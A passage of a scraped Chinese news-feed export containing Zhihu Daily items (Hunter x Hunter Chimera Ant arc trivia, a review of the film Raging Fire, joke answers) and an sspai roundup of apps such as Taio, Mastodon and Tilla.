hidden>阅读原文</a>\n</div>\n<div>\n<p>说几个蚂蚁篇中的冷知识。</p>\n<p><strong><strong>奇美拉蚁(Chimera Ants)</strong></strong></p>\n<p>在诸如“美国观众最讨厌的动画角色”之类的野榜中，有一个人畜无害的面孔总会摘得桂冠，他就是休·塔克。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-abbe025cab44910d4500707d56f8c31b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>塔克必秒团藏！（图源见水印）</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-ccb8ec288587862051fe479d0f710d0c_720w.jpg?source=8673f162\" alt=\"\"><figcaption> https://www.ranker.com/list/unsettling-anime-antagonists/anna-lindwasser</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-ca7d0b5e723fe63ffca89e96324a02de_720w.jpg?source=8673f162\" alt=\"\"><figcaption>https://reelrundown.com/animation/Most-Hated-Anime-Characters</figcaption></figure><p><strong>休·塔克造就了无数读者们的童年阴影，而他研究的“合成兽(キメラ)”来自于希腊神话中的 Chimera，不是 Chimera 君那个 Chimera，是《猎人》中奇美拉蚁的那个 Chimera.</strong></p>\n<p>奇美拉(Chimera)，源自古希腊语的Χίμαιρα，日语キメラ，说人话就是“缝合怪”。</p>\n<p>在希腊神话中，它是大地女神盖亚的后裔，上半身像狮子，中间像山羊，下半身像毒蛇，会喷火。</p>\n<p>奇美拉独特的形体结构，和牛头人（Minotaur，不是 NTR）一同成为了超现实主义艺术的象征。</p>\n<blockquote>超现实主义者对理性力量的否定，加强了奇美拉神话在他们的想象中作为图腾的意义。它与大自然之间的紧密关系，跟超现实主义者借鉴于德国浪漫主义的泛神论非常相似。<br><br>——2021 年香港艺术馆《超现实之外——巴黎庞比度中心藏品展》</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-c850a225c05ef9c20b0107f5b23b3dd0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《奇美拉》 Max Ernst(1928)，香港艺术馆</figcaption></figure><p>《猎人》中的奇美拉蚁，通过女王的“摄食交配”而诞生，从而使其具有其他物种的基因。当女王吃下了人类，诞生的蚂蚁就具有人类的特征，能交谈，取名字，部分蚂蚁还保有人类时期的记忆。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3429505b5bc63e19e794f7a9430a8875_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>米路艾姆（Meruem）</strong></strong></p>\n<p>米路艾姆的名字与阿拉伯语中的一个女性的常用名很像，写成罗马字母为 Maryam 或 Meryem，对应的是英语中的“Mary”。</p>\n<p>关于这个名字的寓意，我们无从得知。但是后面会讲到，富坚是根据埃及神话给三护卫命名的，而埃及语中相似的单词“mry”意为“爱人（beloved）”，“mr”意为“爱（love）”。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0aaf865c7dccf51d98c70414916c1c27_720w.jpg?source=8673f162\" alt=\"\"></figure><ul>\n<li>蚁王在遇到小麦后，就没有再吃过人，这与《幽游白书》中的雷禅类似。</li>\n<li>蚁王的外形与性格，与《龙珠》中的反派弗利萨与沙鲁类似。</li>\n</ul>\n<figure><img src=\"https://pic3.zhimg.com/v2-3aeb1e5c725f14e139c2c7851c515eb5_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>尼菲皮特（Neferpitou）</strong></strong></p>\n<p>在《猎人》中，富坚对皇家护卫的命名都是两个来源的组合：</p>\n<p><strong>一个是埃及神话，另一个是法国儿童读物《卡洛林和她的朋友们 Caroline et ses Amis》。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4a40c1718890147e6a3a5207d87bb1bd_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Caroline et ses Amis</figcaption></figure><p>比如，尼菲皮特（Neferpitou）来自于埃及神话中的植物神<a href=\"http://link.zhihu.com/?target=http%3A//en.wikipedia.org/wiki/Nefertem%2522%2520%255Co%2520%2522wikipedia%3ANefertem\" target=\"_blank\" rel=\"nofollow noreferrer\">Nefertem</a>以及 Caroline et ses Amis 中的角色 Pitou.</p>\n<p>其中，Nefertem 经常被描绘成狮头的形象，而 Pitou 是一头黑豹——都是猫科动物，与皮特的“猫女”设定吻合。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d4e71247af87d037cc3aa29e05c26eef_720w.jpg?source=8673f162\" alt=\"\"><figcaption>古埃及壁画中的 Nefertem</figcaption></figure><p>猫女的招式“玩具修理者”的副标题叫“Doctor Blythe”，这个名字来自于 1972 年 Kenner 玩具公司生产的风靡全球的布偶玩具<strong>“小布”Blythe.</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-22be9977ab3e7433b8024ea3b47de116_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Blythe 系列直接催生了“娃圈”，众多年轻人将大量精力与金钱花费在“娃”的身上，却不求“娃”的回报。</p>\n<blockquote>新人入娃圈 3 个月花销就能超过 1 万，高端玩家氪金几十万都是常事，高端的娃娃甚至可以买到 22 万一个；更有人在娃圈前后投入上百万，还是个 00 后……比盲盒还烧钱，一个娃娃 22 万……<sup>[1]</sup>\n</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-d09441d7ef5c16ade22e264ca469eff6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Blythe doll, 图源网络</figcaption></figure><p>猫女的大招“<strong>黑子舞想 テレプシコーラ</strong>”对应的英文是 Terpsichora，词源是希腊神话中的九位缪斯之一忒耳普西科瑞（Terpsichore）。</p>\n<p>忒耳普西科瑞是舞蹈的发明者，并负责掌管舞蹈。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6c178488f147a7590abc9fd1abdb0603_720w.jpg?source=8673f162\" alt=\"\"><figcaption>黑子舞想</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-b2d1b461a7f221c427dbd4e0b1efb1cf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Terpsichore</figcaption></figure><ul>\n<li>猫女是三大护卫中，唯一一个没有被蔷薇毒死的，也是唯一一个未能知道梅路艾姆的名字的。</li>\n<li>猫女是整部作品中，第二个被小杰杀死的奇美拉蚁（第一个是穿山甲巴罗）。</li>\n<li>在 JUMP 举办的第三次人气投票中，猫女排在第六位，是排名最高的奇美拉蚁。</li>\n</ul>\n<p><strong><strong>孟徒尤匹（Menthuthuyoupi）</strong></strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-124a4e4f927989f05477b765c45c6960_720w.jpg?source=8673f162\" alt=\"\"></figure><p>孟徒尤彼（Menthuthuyoupi）的名字来自埃及神话中的<a href=\"http://link.zhihu.com/?target=http%3A//en.wikipedia.org/wiki/Montu%2522%2520%255Co%2520%2522wikipedia%3AMontu\" target=\"_blank\" rel=\"nofollow noreferrer\">Montu</a>及 Caroline et ses Amis 中的角色 Youpi。</p>\n<p>Montu 具有猎鹰的形象，是古埃及所信奉的战神，在埃及第十一王朝成为国家的守护神。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ed739a1b5e12a437097506a0bc3452e7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Montu</figcaption></figure><ul>\n<li>尤彼和普夫是蚁王后代中，唯二的两个具有五个手指的蚁类。</li>\n<li>尤彼的外形和技能都与《寄生兽》中的反派后藤极为相似。</li>\n</ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-dded46902380f9f29a598c67edb1f19d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《寄生兽》后藤</figcaption></figure><p><strong><strong>沙亚普夫（Shaiapouf）</strong></strong></p>\n<p>沙亚普夫（Shaiapouf）的名字则来自埃及神话中的 Shai 以及 Caroline et ses Amis 中的 Pouf。</p>\n<p>Shai 是埃及神话中“命运”概念的神化。它作为一个抽象的概念，并不具有某一特定性别<sup>[2]</sup>。</p>\n<p>普夫的技能<strong>蝇王（蠅の王，ベルゼブブ）</strong>源自腓尼基神话中的神 Beelzebub。</p>\n<p>Beelzebub 在《旧约》中被称为“鬼王别西卜(Beelzebub the Devil)”与“苍蝇之主（Lord of the Flies）”。恶魔学里认为他是地狱的最高统帅，约翰·弥尔顿将其描绘成是外貌威严的智者，是最强大的堕天使<sup>[3]</sup>。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0126052e01ea6309661268988aebd7c6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Beelzebub</figcaption></figure><p><strong><strong>尼特罗会长（Issac Netero）</strong></strong></p>\n<p>尼特罗的“百世观音” 出招速度极快，出掌时必须先将双手合十，发动时身后会出现一尊巨大的百手观音像，并用观音像的手来攻击对方。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-388728953a861541303793334636166d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>注意，在“零式”之前，观音像始终会有血色的眼泪，这象征着观音慈悲的胸怀与暴烈的掌击之间的巨大矛盾。</p>\n<p>“零式”的发动，是观音像唯一没有流眼泪的时刻。巨大的观音像出现在敌人后方，暴烈的掌击变成了“如耀眼的恒星般的光弹”，“以慈爱的掌衣，温柔地包容对方”。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-daaec8a3b722fcc64c4b6d72d89c1ae7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-5e5da488cbead145fb6276b21a3aa007_720w.jpg?source=8673f162\" alt=\"\"></figure><p>尼特罗会长在与蚁王的战斗中被斩断了左手和右脚，而在猎人考试篇，他与小杰和基路亚抢球，只用了左手和右脚。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7bde64d8d8626b582ef76c9f4e6006e2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-4413ab511ea814e33a01e37e311b6a29_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>拓展阅读</strong></p>\n<p><a href=\"https://www.zhihu.com/question/49579455/answer/2014714940\">同样是巨坑，为何井上让人觉得勤奋，富坚让人觉得『懒惰』呢？</a><a href=\"https://www.zhihu.com/question/20777087/answer/1511504964\">为什么很多人称富坚义博为「老贼」？</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/408112656\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739047"},{"title":"如何评价甄子丹、谢霆锋主演的动作电影《怒火·重案》?","date":"2021-08-09 23:07:41","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-219f4cbc8b396d0fe758acc323f71056_l.jpg?source=8673f162\"><span>阿郎，</span><span>写字阅读看电影</span>\n<a href=\"https://www.zhihu.com/question/392095390/answer/2044623390\" hidden>阅读原文</a>\n</div>\n<div>\n<p>《怒火·重案》最后，谢霆锋问甄子丹“如果你去追可乐，我们的命运会不会调过来?”这一刻触及了这个人物一直秘而不宣的核心层面，为他的乖张与狠戾打上了神秘的命运的柔光。</p>\n<p>在 2003 年伊斯特伍德导演的《神秘河》里，也有一句类似的问话，“如果是我上了那辆车，结果会是怎么样呢?”这句台词让《怒火·重案》具备了与《神秘河》等同的悲怆感。</p>\n<p>在香港动作电影的江海里，翻滚起一股命运偶然性与必然性毫无规律可以遵循的潮汐。</p>\n<p>拼塞在作品里尽皆过火尽是癫狂的暴力，有了更为幽深的心理上的疼痛感。</p>\n<p>《怒火·重案》这个片名就张扬着类型上的火药味，本片的动作场面尤其诠释了怒与重的化学反应。</p>\n<p>可是在动作电影的语序里，再好看的动作，本质上也是暴力，只有动作的原因，才是将暴力合理化甚至是正义化的化学药剂。</p>\n<p>在面对关键性情节这一点，《怒火·重案》避开了正面而来的矛头。</p>\n<p>《怒火·重案》是双雄设置，这种设置的前提是，两者的立场是对立的。在《怒火·重案》一开始，邦主就受到了上司和巨贾联手拖下水的诱迫，这和中段阿敖被利用、被抛弃的性质是一样的，也就是说他们本应该是同一阵营的人。</p>\n<p>但作品里大杀四方的两方，恰恰是本应该站在一起的邦主和阿敖，转折点就是那场轻飘飘法庭做证戏。</p>\n<p>这当然是创作者的一种现实性选择，避开阿敖，站在邦主一方叙事。</p>\n<p>这样一来，固然避开了可能的风险，可也带来了其他的困扰，比如不得不将主角从阿敖置换为邦主，不但怒火这一片名旁落，还将一个宏大的叙事背景简化为两个人的私人恩怨，将重案偷换为私刑。</p>\n<p>所以，《怒火·重案》一直以一种扭曲姿势进行叙事，比如阿敖和他的团队应该是一群死士，都知道那个后果是什么，仍选择快意恩仇，飞蛾扑火。</p>\n<p>所以，阿敖不应该是又邪又恶的悍匪头子，公子等人也应该是自杀，而不是被阿敖所杀，这是几人之间的默契，也是他们豪气干云的决绝和命如飘蓬的悲剧性的一体两面里，暗藏着的那种自毁的气质。</p>\n<p>尤为可惜的是，作品在一个宏大开端之后，就忙于修补这种宏大必须用窄门去讲述所带来的漏洞。</p>\n<p>用来修补的方式，也是港式动作电影惯用的连绵不绝的暴力。这是影片好看的一个原因，也是使得作品最终流于平庸的原因。</p>\n<p>毕竟，作品还有走得更远的可能。</p>\n<p>比如，邦主的设置是港片里常见的暴躁警察，阿敖的设置也是港片里并不鲜见的悲情枭雄。</p>\n<p>但当暴躁警察在解救老婆时，有冲飞虎队开枪的镜头。阿敖等人也在影片开始不久，大规模猎杀了昔日的同袍。</p>\n<p>这些在仓皇之际，从不同角度射出的子弹，揭示了一个凄厉的真相，正义很可能是在公平缺失之后，一个顺手抓取的漂浮物。正义的组成成分里，镶嵌了很多非正义的石子。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/392095390\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739031"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-08-09 23:07:31","description":"\n<div>\n<h2>老师给自己孩子补课算不算违规?</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-4aeba2d1625dc330e8824ed151bdcd99_l.jpg?source=8673f162\"><span>f1ned</span>\n<a href=\"https://www.zhihu.com/question/341065692/answer/802512268\" hidden>阅读原文</a>\n</div>\n<div>\n<p>那老师在家批评教育自己的孩子算不算加班，有没有加班费ॱଳ͘</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/341065692\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>阿里公布「女员工被侵害」处理决定，业务总裁引咎辞职，涉嫌男员工被辞，还有哪些信息值得关注？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-7387bc0d1209a76798888ad035cc5d6e_l.jpg?source=8673f162\"><span>小爝，</span><span>程序员本员，公众号：小爝的日常</span>\n<a href=\"https://www.zhihu.com/question/478321920/answer/2048049753\" hidden>阅读原文</a>\n</div>\n<div>\n<p>可能是有史以来第一个因为钉钉消息已读不回，导致辞职的领导层吧。</p>\n<p>做这个功能的人应该怎么也想不到这么个恶心人的玩意，给公司的高层整不会了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/478321920\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>有哪些让人眼前一亮的「老段子翻新」？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-b633922ac78c07d14f44e31f9a4e4773_l.jpg?source=8673f162\"><span>控心，</span><span>按摩椅测评小能手/关于按摩椅选购疑问免费解答</span>\n<a href=\"https://www.zhihu.com/question/49658352/answer/513304744\" hidden>阅读原文</a>\n</div>\n<div>\n<p>面试官：「你简历上写你心算速度很快，那我问问你，13 乘以 19 等于多少？」</p>\n<p>我脱口而出：「45！」</p>\n<p>面试官：「这也差太多了吧？」</p>\n<p>我：「你就说快不快吧？」</p>\n<p>面试官：「呵呵，那好吧，我们决定录用你为高管，明天来上班吧。」</p>\n<p>第二天……</p>\n<p>我：「说好的高管呢？怎么让我打扫天台？」</p>\n<p>面试官：「你就说高不高吧？」</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/49658352\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>有哪些「听君一席话，如听一席话」的笑话？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-1dc922658909e4d1998c31c8ee938859_l.jpg?source=8673f162\"><span>潘机灵，</span><span>不很经常上</span>\n<a href=\"https://www.zhihu.com/question/475021609/answer/2043595044\" hidden>阅读原文</a>\n</div>\n<div>\n<p>三句话让男人听了我三句话。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/475021609\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>怎样看待「身材都无法控制，还如何控制人生」这句话？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>匿名用户</span>\n<a href=\"https://www.zhihu.com/question/48227005/answer/111985741\" hidden>阅读原文</a>\n</div>\n<div>\n<figure><img src=\"https://pic1.zhimg.com/9484f59524771a9d5c37491c93b6f24a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个胖子，叫做 Gabe Newell。</p>\n<p>他有个更广为流传的名字，叫 G 胖。</p>\n<figure><img src=\"https://pic3.zhimg.com/0be60ca4e20e5f67d03c6635ec75fef7_720w.png?source=8673f162\" alt=\"\"></figure><p>很明显，他没有控制自己的身材。</p>\n<figure><img src=\"https://pic1.zhimg.com/f26f7273d8808e61a3899218d8b8bea2_720w.png?source=8673f162\" alt=\"\"></figure><p>但是，他控制着无数人的钱包。</p>\n<p>……</p>\n<p>可能这人唯一的缺点是不会数 3 吧？【x</p>\n<p>所以，想拉人健身就直说，少灌鸡汤。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/48227005\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9739054"},{"title":"派评 | 近期值得关注的 App","date":"2021-08-09 09:55:06","description":"\n<p>本期《派评》的主要内容有：</p>\n<ul>\n<li>强大的 iOS / iPadOS 文本处理工具 Taio 推出 macOS 版本。</li>\n<li>去中心化社交网络平台 Mastodon 推出官方客户端。</li>\n<li>故事织机：好用的移动端小说创作工具。</li>\n<li>MoneyWiz：老牌记账工具更新多项实用功能。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<h3>Taio：强大的文字处理工具，推出 macOS 版本</h3>\n<ul>\n<li>平台：macOS / iOS / iPadOS</li>\n<li>关键词：Markdown、剪贴板、编辑器</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：在经过 Pin、JSBox 等 App 的开路后，Taio 作为一款集剪贴板、编辑器和文本动作于一身的全能工具，在 iOS 端一经发布后就广受赞誉。虽然先前 Taio 迟迟没有发布原生 macOS 应用，但很多 M1 电脑用户都喜欢通过非官方支持的方式 sideload 以在桌面端使用 Taio。近日，开发者终于推出了基于 Intel + Apple Silicon 的 Universal 架构上的 Mac 应用，让用户可以获得稳定高效的使用体验。</p>\n<p>整体而言，Taio 的 macOS 版功能与 iOS 版基本一致，老用户完全没有学习成本。对于新用户来说，剪贴板、编辑器和文本动作三个模块配合引导内容，也足够简单易上手。</p>\n<p>Taio for Mac 的剪贴板会自动读取系统剪贴板，也可以手动添加内容，并且可以通过 iCloud 进行设备间的同步。对于剪贴板上的内容，除了基础的复制、分享等操作，Taio 还可以使用动作库里的动作对其进行搜索、翻译、引用、合并或者其他你自定义的操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0qtb34tcdnn5b4a0.png\"></figure><p>Taio for Mac 的编辑器也足够好用，完全可以和其它老牌 Markdown 编辑器处于同一梯队。首先，Taio 采用了开放的文件系统，所有内容都可以被其它编辑器直接读写。另外，Taio 支持 CommonMark 和 GitHub Flavored 标准，还可以编辑数学公式和绘制图表，在确保功能全面的基础上兼顾了兼容性。</p>\n<p>值得一提的是，Taio 在大纲、预览、双向链接、网络视图等方面的支持也非常到位，配得上一个专业编辑器的称号。当然，Taio 的编辑器也支持动作库的动作，可以快速进行插入中英文空格、格式美化、整理段落、大小写转换等丰富的操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0rdb34tcdd5rnqm0.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0rtb34tcdj3korig.png\"></figure><p>Taio for Mac 的动作库在 Mac 端获得了更好的编辑体验。我们可以在界面上通过更合理的分区和更快捷的拖拽操作来提高编辑效率。可视化的编辑器也让代码小白可以更加直观地入门编写基于 JavaScript 的动作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0s5b34tcditlgkfg.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0sdb34tcdj3korj0.png\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/taio-markdown-%E7%BC%96%E8%BE%91%E5%99%A8%E5%92%8C%E5%BF%AB%E6%8D%B7%E5%8A%A8%E4%BD%9C/id1527036273\" target=\"_blank\">App Store</a> 下载 Taio for Mac，年订阅售价 108 元，永久买断版本售价 248 元。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/68179\" target=\"_blank\">文字处理工具 Taio 发布 Mac 版本</a></p>\n<span class=\"ss-application\" app-id=\"15830\"> </span><h3>Mastodon：去中心化社交网络平台，推出首个官方客户端</h3>\n<ul>\n<li>平台：iOS</li>\n<li>关键词：社交网络</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：相比 Twitter、Facebook、微博这样的大型公共社交网络，Mastodon 的运营模式更为特殊，它更像是早年小众论坛的「社交网络重制版」，对于希望和同好而不是陌生人进行交流的朋友而言，这种去中心化的网络更注重隐私，更像是我们常说的熟人小圈子社交。</p>\n<p>不过 Mastodon 一直以来因为其去中心化，因此都没有推出过官方客户端，这在这个社交全靠手机的时代似乎有些「格格不入」，好在最近其终于推出了官方的客户端，即便是一个 Mastodon 新手也可以快速上手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0stb34tcdd5rnqmg.png\"></figure><p>应用使用起来其实也颇具Mastodon 特色：相比其他家社交网站 App，注册和登录 Mastodon 的第二步则是选择你想要加入的服务器，这也是 Mastodon 和其他社交网站平台所不同的地方——用户需要选择自己希望加入的「圈子」，而不是等待平台给你推荐想要关注的人。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0t5b34tcditlgkg0.png\"></figure><p>选择好服务器并登录之后，你就可以加入并参与到当前的 Mastodon 服务器的社交讨论了，而这个信息流的展现形式也和 Twitter 颇为相似，你可以关注你感兴趣的人、发表你的观点或者转发别人的信息——实际用起来和 Twitter 还是比较类似的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0tdb34tcdd5rnqn0.png\"></figure><p>要说到和 Twitter 唯一的区别，可能就是所谓的跨节点关注了，由于 Mastodon 是一个去中心化的社交网络，实际上大家注册的只是某个 Mastodon 服务器节点的账户，但你依旧可以关注其他服务器上的 Mastodon 用户，当然相比 Twitter 的推荐算法，Mastodon 想要关注你所感兴趣的外服用户可能要折腾一番。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0ttb34tcdd5rnqng.png\"></figure><p>如果你目前正在使用 Mastodon 并使用第三方的客户端，那么不妨试试这个官方推出的 Mastodon for iOS 客户端，目前已经在 <a href=\"https://apps.apple.com/cn/app/mastodon-for-iphone/id1571998974\" target=\"_blank\">App Store</a> 提供免费下载。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/46868\" target=\"_blank\">更加开放的社交网络，「长毛象」让你自由地分享想法</a></p>\n<span class=\"ss-application\" app-id=\"16133\"> </span><h3>故事织机：随手写出你想象中的世界</h3>\n<ul>\n<li>平台：Android / iOS</li>\n<li>关键词：小说、写作</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：相信以前的你会在被窝里偷偷地看小说，然后幻想自己是里面的主人公惩恶扬善、天降正义，那你有没有想过自己写一部小说或者舞台剧？试试故事织机这款 App 吧，它提供了非常全面的写作引导，你只需要稍加润色，就可以利用它将零碎素材拼凑成一部完整作品了。</p>\n<p>故事织机分为两个功能模块：素材本和剧作本。素材本顾名思义就是存放素材的地方，我们可以把偶尔迸发的灵感扔进这里，可以是角色、故事情节，或者是一场大战描述和结尾的升华，每一个素材都可以归属于一个文件夹，并配置不同颜色用以区分，比如角色用白色表示、关键情节用红色表示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0v5b34tcditlgkh0.png\"></figure><p>随着日积月累，素材慢慢变多，这些素材能够直接拼凑起来形成剧作，于是我们就来到了剧作本模块。使用剧作本时要选择内容篇幅，故事织机会根据篇幅不同而提供有针对性的描述引导。如果你是在素材本里选择「以素材制作故事情节」，就一步步根据引导去选择角色、情节、转折等等内容，完成后就来到了这部作品的故事情节页面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f0vtb34tcditlgkhg.png\"></figure><p>故事情节页面中已经填充好了刚才你选择的内容，每一项内容里由有着更为详细的描述，对于舞台剧或者小剧本来说，这里还可以完善分镜和台词。一个故事一定要有世界观和人物关系，所以就需要切换故事情节页面上方的不同标签去描述世界观、角色的背景故事、创作出发点甚至是你独特的想法等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f105b34tcdnn5b4b0.png\"></figure><p>故事织机并非一个写作工具，而是一个故事创作的收集和引导工具，你只要有想法，就可以利用它去创作出一个独一无二的奇幻世界。现在，你可以在 <a href=\"https://play.google.com/store/apps/details?id=com.hhatamanga.storyplotter&amp;hl=zh&amp;gl=US\" target=\"_blank\">Google Play</a> 和 <a href=\"https://apps.apple.com/cn/app/%E6%95%85%E4%BA%8B%E7%BB%87%E6%9C%BA/id1491980862\" target=\"_blank\">App Store</a> 免费下载故事织机，并根据应用内引导找到桌面端的使用方式。</p>\n<span class=\"ss-application\" app-id=\"16135\"> </span><h3>Tilla：清楚掌握你的服务订阅情况</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：订阅管理</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Peggy_\" user-id=\"bs2p015b34tch278nkdg\" href=\"https://sspai.com/u/5isr02uh\">@Peggy_</a>：随着越来越多的服务乃至应用开始采用订阅制度，各不相同的订阅金额、扣款时间很容易就会让我们对自己的财务状况失去掌控。要么不知道钱花在了哪里，每个月糊里糊涂续了费，要么就是被看似便宜的订阅价格诱惑，不知不觉中越订越多。为了避免这种情况，我们可以使用专门的订阅服务管理应用来监测自己的服务订阅情况。</p>\n<p>Tilla 内置了一个包括 Apple Music、Dropbox、Netflix 等常见订阅服务在内的列表,如果其中包含你正在使用的订阅服务，你只需要挑选并设置相应的付费时间即可。如果这个列表里没有你正在使用的订阅服务，你也可以手动自行添加。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f10lb34tcdnn5b4bg.jpeg\"></figure><p>添加相应的服务时，你可以对名称、图标、颜色等进行自定义，并对金额、币种、扣款日期、付费周期以及订阅类别等进行详细设置。此外，如果你希望在下次付费前收到提醒，还可以打开「接收提醒」并选择希望收到提醒的确切时间。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c48f10tb34tcdd5rnqo0.jpeg\"></figure><p>添加好你的所有订阅服务后，你可以通过点击主界面的「总计开销」清楚地看到每周、每月或每年你所需要花费的总金额，目前此处仅支持以美元显示，相信后期随着开发者对应用的不断完善，我们便能自定义显示币种了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c48f11db34tcdd5rnqog.jpeg\"></figure><p>Tilla 目前分为普通版和高级版，普通版仅包含基础功能，并限制了添加订阅的数量，高级版则不无此限制，并额外提供深色模式与跨设备同步选项，其中跨设备同步默认利用 Google 云盘进行。</p>\n<p>你可以通过 <a href=\"https://play.google.com/store/apps/details?id=com.pavelrekun.tilla\" target=\"_blank\">Play Store</a> 下载体验 Tilla 免费版，或是直接 <a href=\"https://play.google.com/store/apps/details?id=com.pavelrekun.tilla.premium\" target=\"_blank\">购买</a> Tilla 高级版。</p>\n<span class=\"ss-application\" app-id=\"16136\"> </span><h3>Coaster：第三方 Unsplash 客户端新选择</h3>\n<ul>\n<li>平台：macOS / Windows</li>\n<li>关键词：无版权图库、壁纸</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@红酒皇\" user-id=\"bs2p85tb34tcs0pmdeeg\" href=\"https://sspai.com/u/Fabrina\">@红酒皇</a>：我们常常碰到这种时候，比如在发朋友圈时想要配一张相关的照片，或发表文章需要插入图片增加可读性，想要找到不太俗气的图片可却无从下手，从几大知名网站中看中的图片却又价格高昂。Coaster 为这种困境提供了解决方案，它能够在 Unsplash 中搜索免费的无版权照片与合集，让人快速找到符合心意的配图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/b8e4a876374778bdc718758beafbb615.png\"></figure><p>Coaster 的界面清晰，结构简单，打开后只需要在搜索栏中输入关键词，就可以直达图片或合集列表。选中图片后，Coaster 